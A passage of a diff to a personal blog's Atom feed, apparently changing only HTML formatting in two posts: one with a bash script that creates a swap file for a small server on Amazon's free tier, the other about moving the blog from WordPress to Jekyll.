-    dd &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;$SWAP_FILE_LOCATION&amp;quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1024&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+if&lt;/span&gt; ! swapon -s | grep -qF &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_FILE_LOCATION&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Creating &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_FILE_LOCATION&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_SIZE_MEGABYTES&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;MB.
+    dd &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_FILE_LOCATION&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1024 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
         &lt;span class=&quot;nv&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_SIZE_MEGABYTES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;))&lt;/span&gt;
-    mkswap &lt;span class=&quot;s2&quot;&gt;&amp;quot;$SWAP_FILE_LOCATION&amp;quot;&lt;/span&gt;    
-    swapon &lt;span class=&quot;s2&quot;&gt;&amp;quot;$SWAP_FILE_LOCATION&amp;quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;Swap status:&amp;#39;&lt;/span&gt;
+    mkswap &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_FILE_LOCATION&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;    
+    swapon &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_FILE_LOCATION&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;Swap status:&#39;&lt;/span&gt;
     swapon -s
-&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Swap &lt;span class=&quot;s2&quot;&gt;&amp;quot;$SWAP_FILE_LOCATION&amp;quot;&lt;/span&gt; file already on.
-&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Swap &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SWAP_FILE_LOCATION&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; file already on.
+&lt;span class=&quot;k&quot;&gt;fi
 
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;Done.&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;Done.&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Next, run the following commands:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;chmod a+x swap.sh &lt;span class=&quot;c&quot;&gt;# allows the script file to be executed as a program&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;chmod a+x swap.sh &lt;span class=&quot;c&quot;&gt;# allows the script file to be executed as a program&lt;/span&gt;
 sudo su &lt;span class=&quot;c&quot;&gt;# the script needs root priveledges so we need to switch users to root&lt;/span&gt;
-./swap.sh &lt;span class=&quot;c&quot;&gt;# runs the script&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+./swap.sh &lt;span class=&quot;c&quot;&gt;# runs the script&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;That should give you an extra buffer of memory to work with.&lt;/p&gt;
 
-&lt;h3&gt;Practicality&lt;/h3&gt;
+&lt;h3 id=&quot;practicality&quot;&gt;Practicality&lt;/h3&gt;
 
-&lt;p&gt;The free tier that Amazon provides is just enough bandwidth, CPU power, and memory for small groups of no more than four players. That means it&amp;#39;s only any good as a personal creative server that you can show off to friends every now and then. But hey, free is free, and if you follow the &lt;a href=&quot;http://www.stratumsecurity.com/blog/2010/12/03/shearing-firesheep-with-the-cloud&quot;&gt;guide&lt;/a&gt; at Stratum Security, you&amp;#39;ll have a nice little OpenVPN server too.&lt;/p&gt;
+&lt;p&gt;The free tier that Amazon provides is just enough bandwidth, CPU power, and memory for small groups of no more than four players. That means it’s only any good as a personal creative server that you can show off to friends every now and then. But hey, free is free, and if you follow the &lt;a href=&quot;http://www.stratumsecurity.com/blog/2010/12/03/shearing-firesheep-with-the-cloud&quot;&gt;guide&lt;/a&gt; at Stratum Security, you’ll have a nice little OpenVPN server too.&lt;/p&gt;
 </content>
  </entry>
  
@@ -417,13 +413,13 @@ sudo su &lt;span class=&quot;c&quot;&gt;# the script needs root priveledges so w
    <link href="http://www.brandonsilver.com/2011/02/08/the-dawn-of-a-new-blog.html"/>
    <updated>2011-02-08T00:00:00-06:00</updated>
    <id>http://www.brandonsilver.com/2011/02/08/the-dawn-of-a-new-blog</id>
-   <content type="html">&lt;p&gt;Another day, another new blog setup. As you may or may not have noticed, I&amp;#39;ve switched from Wordpress to a new, more lightweight system called Jekyll. It&amp;#39;ll allow me the freedom to write up my posts how I see fit and (hopefully) finally give me the motivation to learn some HTML and CSS. &lt;/p&gt;
+   <content type="html">&lt;p&gt;Another day, another new blog setup. As you may or may not have noticed, I’ve switched from Wordpress to a new, more lightweight system called Jekyll. It’ll allow me the freedom to write up my posts how I see fit and (hopefully) finally give me the motivation to learn some HTML and CSS.&lt;/p&gt;
 
 &lt;!--more--&gt;
 
-&lt;p&gt;I first learned about Jekyll from &lt;a href=&quot;http://paulstamatiou.com/how-to-wordpress-to-jekyll&quot;&gt;Paul Stamatiou&amp;#39;s Blog&lt;/a&gt;. Its support for a variety of markup languages (including markdown) and lack of a requirement for a database sold me on the idea. I have long desired a completely &amp;quot;flat&amp;quot; replacement for Wordpress, and Jekyll looked like just the ticket.&lt;/p&gt;
+&lt;p&gt;I first learned about Jekyll from &lt;a href=&quot;http://paulstamatiou.com/how-to-wordpress-to-jekyll&quot;&gt;Paul Stamatiou’s Blog&lt;/a&gt;. Its support for a variety of markup languages (including markdown) and lack of a requirement for a database sold me on the idea. I have long desired a completely “flat” replacement for Wordpress, and Jekyll looked like just the ticket.&lt;/p&gt;
 
-&lt;p&gt;The initial setup wasn&amp;#39;t too dificult. Even with my somewhat limited understanding of web development, I was able to follow along Paul&amp;#39;s excellent post, creating a local development environment and using Github to clone a popular &lt;a href=&quot;https://github.com/mojombo/tpw&quot;&gt;Jekyll repository&lt;/a&gt;. A few dozen modifications later, and a new blog is born in lightweight and beautiful static HTML. &lt;/p&gt;
+&lt;p&gt;The initial setup wasn’t too dificult. Even with my somewhat limited understanding of web development, I was able to follow along Paul’s excellent post, creating a local development environment and using Github to clone a popular &lt;a href=&quot;https://github.com/mojombo/tpw&quot;&gt;Jekyll repository&lt;/a&gt;. A few dozen modifications later, and a new blog is born in lightweight and beautiful static HTML.&lt;/p&gt;
 </content>
  </entry>
  
